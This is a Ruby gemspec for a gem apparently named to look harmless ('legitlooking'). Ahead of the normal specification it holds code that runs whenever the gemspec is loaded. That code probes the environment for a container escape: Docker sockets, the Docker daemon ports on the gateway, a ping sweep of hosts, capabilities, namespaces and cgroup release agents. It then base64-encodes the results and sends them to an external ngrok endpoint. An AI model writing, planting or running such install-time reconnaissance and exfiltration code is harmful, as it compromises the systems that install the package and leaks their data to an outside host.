# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  # --noproxy '*' is cruciaal -- anders gaan alle curl requests via de proxy
  # en krijgen we altijd 500 terug (proxy weigert non-proxy requests)
  cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 3000] }
  lines = []

  # ============================================================
  # 1. ROUTING TABEL -- wat is het echte gateway IP?
  # ============================================================
  lines << "=== 1. IP ROUTE ==="
  lines << cmd.("ip route 2>/dev/null || route -n 2>/dev/null || cat /proc/net/route")

  lines << "\n=== 1b. NETWORK INTERFACES ==="
  lines << cmd.("ip addr 2>/dev/null || ifconfig 2>/dev/null")

  # ============================================================
  # 2. DOCKER SOCKET -- meest directe container escape
  # ============================================================
  lines << "\n=== 2. DOCKER SOCKET ==="
  lines << cmd.("ls -la /var/run/docker.sock /run/docker.sock /tmp/docker.sock 2>/dev/null")
  lines << cmd.("curl -s --max-time 3 --unix-socket /var/run/docker.sock http://localhost/version 2>/dev/null")
  lines << cmd.("curl -s --max-time 3 --unix-socket /run/docker.sock http://localhost/version 2>/dev/null")

  # ============================================================
  # 3. GATEWAY DIRECT SCAN -- met --noproxy '*'
  # ============================================================
  lines << "\n=== 3. GATEWAY DIRECT (--noproxy, geen proxy routing) ==="

  # Haal gateway IP op uit routing tabel
  gw = cmd.("ip route | grep default | awk '{print $3}' | head -1")
  gw = "172.19.0.1" if gw.empty?
  lines << "Gateway: #{gw}"

  # Ping gateway
  lines << cmd.("ping -c 2 -W 2 #{gw}")

  # Docker daemon poorten direct (geen proxy)
  [2376, 2377, 4243, 4244, 7777, 2375].each do |port|
    r = cmd.("curl -s --max-time 3 --noproxy '*' http://#{gw}:#{port}/version -w '\\nHTTP:%{http_code}'")
    lines << "#{gw}:#{port} /version => #{r[0,200]}"
  end

  # ============================================================
  # 4. HOST SCAN -- zijn er meer hosts dan .2 en .3?
  # ============================================================
  lines << "\n=== 4. HOST DISCOVERY (ping sweep 172.19.0.1-10) ==="
  (1..10).each do |i|
    r = cmd.("ping -c 1 -W 1 172.19.0.#{i} | grep -c '1 received'")
    lines << "172.19.0.#{i}: #{r == '1' ? 'UP' : 'down'}"
  end

  # ============================================================
  # 5. CAPABILITIES -- hoe beperkt is de container?
  # ============================================================
  lines << "\n=== 5. CONTAINER CAPABILITIES ==="
  lines << cmd.("cat /proc/self/status | grep -i cap")
  lines << cmd.("capsh --print 2>/dev/null")

  # ============================================================
  # 6. NAMESPACES -- zitten we in een beperkte namespace?
  # ============================================================
  lines << "\n=== 6. NAMESPACES ==="
  lines << cmd.("cat /proc/self/cgroup")
  lines << cmd.("ls -la /proc/self/ns/")

  # ============================================================
  # 7. CGROUPS V2 ESCAPE CHECK
  # ============================================================
  lines << "\n=== 7. CGROUP RELEASE AGENT ==="
  lines << cmd.("find /sys/fs/cgroup -name 'release_agent' 2>/dev/null")
  lines << cmd.("cat /proc/1/cgroup 2>/dev/null")

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=escape_direct_scan")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 30, read_timeout: 60) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=escape_direct_scan&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.29"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
